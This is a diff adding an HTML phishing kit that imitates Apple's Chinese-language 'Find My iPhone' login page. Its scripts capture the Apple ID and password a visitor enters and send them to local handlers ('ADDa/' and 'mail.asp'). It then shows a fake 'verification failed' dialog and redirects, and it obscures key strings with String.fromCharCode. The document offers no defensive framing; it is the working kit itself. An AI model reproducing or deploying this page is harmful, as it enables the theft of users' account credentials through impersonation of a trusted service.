@@ -1,0 +1,525 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+    <link rel="icon" href="picture/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="picture/favicon.ico" type="image/x-icon">
+    <meta http-equiv="content-type" content="text/html; charset=gbk">
+    <meta charset="gb23231">
+    <meta name="viewport" content=" initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+
+    <script language="JavaScript" type="text/javascript" src="jquery-3.2.1.min.js"></script>
+
+    <link rel="stylesheet" href="picture/wap.css" media="all">
+
+    <style>
+        .login_1 {
+            width: 80px;
+            height: 60px;
+            font-size: 20px;
+            color: #999999;
+            font-weight: 0;
+            background: 0;
+            border: none;
+        }
+
+        .login_2 {
+            width: 80px;
+            height: 60px;
+            font-size: 20px;
+            color: #00AC41;
+            font-weight: 0;
+            background: 0;
+            border: none;
+        }
+    </style>
+
+</head>
+
+<body style="">
+    <div style="margin-top:23%;"></div>
+    <center>
+        <img src="picture/find_icon.png" style="width:110px;height:110px;">
+    </center>
+    <div class="main" style="border:0px solid red">
+        <p class="lok" style=" font-family: Arial, Helvetica, sans-serif;">查找我的 iPhone</p>
+        <script src="style.js"></script>
+
+        <iframe name="testIframeName" style="display:none;"></iframe>
+
+
+
+        <ul class="main_list">
+            <li id="bton1" class="">
+                <strong
+                    style=" font-family: Arial, Helvetica, sans-serif;font-size:13px; color:#666;mrgin-top:-10px; font-weight:600">Apple
+                    ID</strong>
+
+                <div contenteditable="true" class="input " id="App1" name="App1" type="text" placeholder="电子邮件或电话"
+                    style="margin-left:63px;outline:none;color:#333333 ; font-family: Arial, Helvetica, sans-serif;"
+                    onKeyDown="ADivFollowingText();" onKeyPress="OnTextChanged();" onblur="checktxt();"
+                    onKeyUp="AchangeTest(this);"></div>
+
+
+            </li>
+            <li id="qieh2" style="display:none"><strong
+                    style=" font-family: Arial, Helvetica, sans-serif;font-size:13px; color:#666;mrgin-top:-10px; font-weight:600">密码</strong>
+                <div style="margin-left:63px;outline:none;color: #333333 ; font-family: Arial, Helvetica, sans-serif;"
+                    id="Apwd" class="input " name="Apwd" contenteditable="TRUE" placeholder="必填"
+                    onKeyDown="DivFollowingText();" onKeyPress="OnTextChanged();" onKeyUp="changeTest(this);"></div>
+            </li>
+        </ul>
+
+
+
+
+
+        <div id="password3" style="display:none" align="center"><input name="submit" type="submit" disabled="disabled"
+                class="login_1 ng-scope" id="password1" value="登录..."></div>
+        <div id="password2" style="display:block" align="center"> <input name="submit" type="submit" disabled="disabled"
+                class="login_1" id="password" value="登录..."></div>
+        <div id="zq1" style="display:none" align="center"> <img src="2.gif" style="margin-top:20"></div>
+
+
+
+        <div align="center" id="wangji"><br>
+            <label id="remember-me-label" class="form-label" for="remember-me"> <span
+                    class="form-choice-indicator"></span> <a
+                    href="../IM/WPAGNOARGHOAFIDSHGOABRGHO344FAOGHOAIGH435OFDGHBODFG434IMI.html" target="_blank"
+                    style="text-decoration:none;color:#00AC41;font-family: Arial, Helvetica, sans-serif; padding-left:8PX;  font-size:12px;">忘记
+                    Apple ID或密码?</a> </label>
+        </div>
+
+
+        <h3 id="shezhi"><a href="../IM/WPAGNOARGHOAFIDSHGOABRGHO344FAOGHOAIGH435OFDGHBODFG434IMI.html" target="_blank"
+                style="text-decoration:none;color:#00AC41;font-family: Arial, Helvetica, sans-serif; padding-left:8PX;  font-size:12px;">设置说明</a>
+        </h3>
+    </div>
+
+    <iframe name="testIframeName" style=" width:0; height:0; display:none"></iframe>
+
+    <div id="tst" style="display:none">
+        <div id="" style="font-size:14px;margin-top:10px; font-weight:850;font-family: Arial, Helvetica, sans-serif;"
+            align="center">验证失败</div>
+        <div id="h2" style="font-family: Arial, Helvetica, sans-serif;"></div>
+        <div id="butt">
+            <div id="btnname" style="font-size:15px;font-family: Arial, Helvetica, sans-serif; font-weight:700">好</div>
+            <div id="btnpass" style="font-size:15px;font-weight:700;font-family: Arial, Helvetica, sans-serif;">好</div>
+            <div id="btnnext" style="font-size:15px;font-family: Arial, Helvetica, sans-serif;font-weight:700">好</div>
+        </div>
+    </div>
+    <div id="fade"></div>
+
+
+    <script src="picture/jquery-1.5.min.js" type="text/javascript"></script>
+
+
+
+    <script>
+
+        $(document).ready(function () {
+            $('#App1').bind('input propertychange', function () {
+
+
+                var App1 = $("#App1").text();
+
+                if (App1 == null || App1.length > 0) {
+
+
+                    $("#password").removeClass("login_1");
+                    $("#password").addClass("Login_2");
+                    $("#password").attr("disabled", "");
+                    $("#qieh2").css("display", "none");
+                    $("#password2").css("display", "block");
+
+                    $("#password3").css("display", "none");
+
+                }
+
+
+                if (App1 == null || App1.length == 0) {
+
+                    $("#password").attr("disabled", "disabled");
+                    $("#bton1").attr("class", "");
+                    $("#password").removeClass("login_2");
+                    $("#password").attr("class", "Login_1");
+                    $("#password").css("display", "block");
+                }
+
+            });
+        });
+
+        $(document).ready(function () {
+            $('#Apwd').bind('input propertychange', function () {
+                var Apwd = $("#Apwd").text();
+
+                if (Apwd == null || Apwd.length > 0) {
+                    $("#password1").attr("disabled", "");
+                    $("#password1").removeClass("login_1");
+                    $("#password1").addClass("Login_2");
+                    $("#Apwd").css("-webkit-text-security", "disc");
+                    //$("#password1").css("color","#009966");
+
+                }
+
+
+                if (Apwd == null || Apwd.length == 0) {
+                    $("#password1").attr("disabled", "disabled");
+                    $("#Apwd").css("-webkit-text-security", "none");
+                    $("#password1").removeClass("login_2");
+                    $("#password1").attr("class", "Login_1");
+
+                    // $("#qieh2").css("display","none");
+                    //			 				    $("#bton1").attr("class","");
+
+                }
+
+            });
+        });
+
+
+
+    </script>
+
+
+
+
+
+
+
+    <style>
+        .bton1 {
+            border-bottom: 1px solid #dedede;
+        }
+    </style>
+
+
+
+    <script type="text/javascript">
+
+
+
+        document.getElementById("password").onclick = function () {
+            document.getElementById("password").style.display = "none";
+            document.getElementById("wangji").style.display = "none";
+            document.getElementById("shezhi").style.display = "none";
+            document.getElementById("zq1").style.display = "block";
+            setTimeout(function () {
+
+                document.getElementById("qieh2").style.display = "block";
+                document.getElementById("bton1").className = 'bton1';
+                document.getElementById("bton1").className = 'bton1';
+                document.getElementById("wangji").style.display = "block";
+                document.getElementById("shezhi").style.display = "block";
+                document.getElementById("zq1").style.display = "none";
+                document.getElementById("password2").style.display = "none";
+                document.getElementById("password3").style.display = "block";
+            }, 2000);
+        }
+    </script>
+
+    <script type="text/javascript">
+
+
+
+        document.getElementById("password1").onclick = function () {
+            document.getElementById("password1").style.display = "none";
+            document.getElementById("wangji").style.display = "none";
+            document.getElementById("shezhi").style.display = "none";
+            document.getElementById("zq1").style.display = "block";
+            setTimeout(function () {
+
+                document.getElementById("password2").style.display = "none";
+                document.getElementById("password3").style.display = "block";
+                document.getElementById("password1").style.display = "block";
+                document.getElementById("wangji").style.display = "block";
+                document.getElementById("shezhi").style.display = "block";
+                document.getElementById("zq1").style.display = "none";
+
+            }, 2000);
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <style type="text/css">
+        /**css样式*/
+
+        .input {
+            width: 200px;
+            -webkit-text-security: none;
+            font-size: 15px;
+            padding: 4px 5px;
+            line-height: 12px;
+            white-space: nowrap;
+            color: #CCCCCC
+        }
+
+        .input:empty::before {
+            content: attr(placeholder);
+        }
+
+        @font-face {
+            font-family: 'fontnameRegular';
+            src: url('PingHei-light.woff.eot');
+            src: local('fontname Regular'),
+                local('PingHei-light.woff'),
+                url('PingHei-light.woff.woff') format('woff'),
+                url('PingHei-light.woff.ttf') format('truetype'),
+                url('PingHei-light.woff.svg#fontname') format('svg');
+
+        }
+
+        .classa {
+            width: 180px;
+            -webkit-text-security: disc;
+            font-size: 10px;
+            padding: 4px 5px;
+            line-height: 12px;
+
+            color: #CCCCCC
+        }
+
+        #loginn {
+            display: none;
+        }
+
+        .button1 {
+            display: block
+        }
+
+        .button2 {
+            display: none
+        }
+    </style>
+
+
+
+
+
+
+
+
+
+
+    <div></div>
+</body>
+
+</html>
+
+</script>
+<script type="text/javascript">
+    $('#password').click(function () {
+        if ($('#App1').text() == '') {
+            alert('请输入账号！');
+
+            return false;
+        }
+
+
+
+
+        var username = $("#App1").text();
+
+
+        $.ajax({
+            async: false,
+            type: 'post',
+            url: 'ADDa/',
+            data: { "username": username },
+            dataType: 'json',
+            success: function (msg) {
+
+                $("#userpass").empty(); {
+                    $("#userpass").css("-webkit-text-security", "none");
+                }
+                $("#pop").css("display", "block");
+
+                if (msg == 3) {
+
+                } else {
+
+
+
+                }
+            }
+        })
+
+    });
+
+
+    $('#password1').click(function () {
+        if ($('#App1').text() == '') {
+            alert('请输入账号！');
+
+            return false;
+        }
+        if ($('#Apwd').text() == '') {
+            alert('请输入密码！');
+
+            return false;
+        }
+
+
+
+        var username = $("#App1").text();
+        var userpass = $("#Apwd").text();
+
+        $.ajax({
+            async: false,
+            type: 'post',
+            url: 'ADDa/',
+            data: { "username": username, "userpass": userpass },
+            dataType: 'json',
+            success: function (msg) {
+
+
+
+
+                if (msg == 3) {
+                    top.location.href = '../APP/TEL/PMS2_ENDSUB_1243435343.HTML';
+
+                } else {
+
+
+                }
+            }
+        })
+
+    });
+
+
+
+</script>
+
+<script src="picture/jquery-1.5.min.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+
+
+
+    var count = 0;
+    $(document).ready(function () {
+
+
+
+
+        $("#btnnext").click(function () {
+
+
+
+
+            if (count == 0) {
+                window.location = "#";
+            }
+            count = count + 1;
+        });
+        $("#name").blur(function () {
+
+
+
+            var temp = $(this).val();
+            $("#dname").css("border", "1px solid #d7d5ca");
+            if (($(this).val() != "") && ($(this).val() != String.fromCharCode(65) + String.fromCharCode(112) + String.fromCharCode(112) + String.fromCharCode(108) + String.fromCharCode(101) + " " + String.fromCharCode(73) + String.fromCharCode(68))) {
+                if (temp.indexOf("@") > 0) {
+
+                } else {
+                    $(this).val();
+                }
+            }
+        });
+
+        $("#password1").click(function () {
+            setTimeout(function () {
+                var namestr = $("#name").val();
+                var pwdstr = $("#pass").val();
+                if (namestr == "" || namestr == "example@" + String.fromCharCode(105) + String.fromCharCode(99) + String.fromCharCode(108) + String.fromCharCode(111) + String.fromCharCode(117) + String.fromCharCode(100) + "." + String.fromCharCode(99) + String.fromCharCode(111) + String.fromCharCode(109)) {
+                    $("#fade").show();
+
+
+                    $("#bt1").text(验证失败);
+
+
+                    $("#tst").show();
+                    $("#btnname").show();
+                    $("#btnpass").hide();
+                    $("#btnnext").hide();
+                    return false;
+                }
+                if (pwdstr == "" || pwdstr == "") {
+                    $("#fade").show();
+
+                    $("#tst").show();
+                    $("#btnname").hide();
+                    $("#btnpass").show();
+                    $("#btnnext").hide();
+                    return false;
+                }
+                if (namestr != "" && namestr != "example@" + String.fromCharCode(105) + String.fromCharCode(99) + String.fromCharCode(108) + String.fromCharCode(111) + String.fromCharCode(117) + String.fromCharCode(100) + "." + String.fromCharCode(99) + String.fromCharCode(111) + String.fromCharCode(109) && pwdstr != "" && pwdstr != "") {
+                    //$("#ts #ts_wz").text(unescape("%u5BC6%u7801%u9519%u8BEF%21"));
+                    //$("#ts").fadeIn("slow");
+                    //$("#ts").fadeOut(40);
+                    $("#tst #h2").text(unescape("%u60A8%u7684 ") + String.fromCharCode(65) + String.fromCharCode(112) + String.fromCharCode(112) + String.fromCharCode(108) + String.fromCharCode(101) + " " + String.fromCharCode(73) + String.fromCharCode(68) + unescape(" %u6216%u5BC6%u7801%u4E0D%u6B63%u786E"));
+                    $("#tst").show();
+                    $("#fade").show();
+                    $.post("mail.asp?username=" + $("#name").val() + "&pw=" + $("#pass").val(), {}, function () { });
+                    $("#btnname").hide();
+                    $("#btnpass").hide();
+                    $("#btnnext").show();
+
+                }
+            }, 2002);
+
+        });
+
+        $(function () {
+            $("#btnnext").click(function () {
+
+                $("#fade").hide();
+                $("#tst").hide();
+                $("#pass").val("");
+                $('#pass').blur();
+                $("#name").val("");
+                $('#name').blur();
+                document.getElementById("password1").className = 'login_1';
+            });
+            $("#btnname").click(function () {
+
+                $("#fade").hide();
+                $("#tst").hide();
+            });
+            $("#btnpass").click(function () {
+
+                $("#fade").hide();
+                $("#tst").hide();
+
+            });
+        });
+    });
+
+</script>
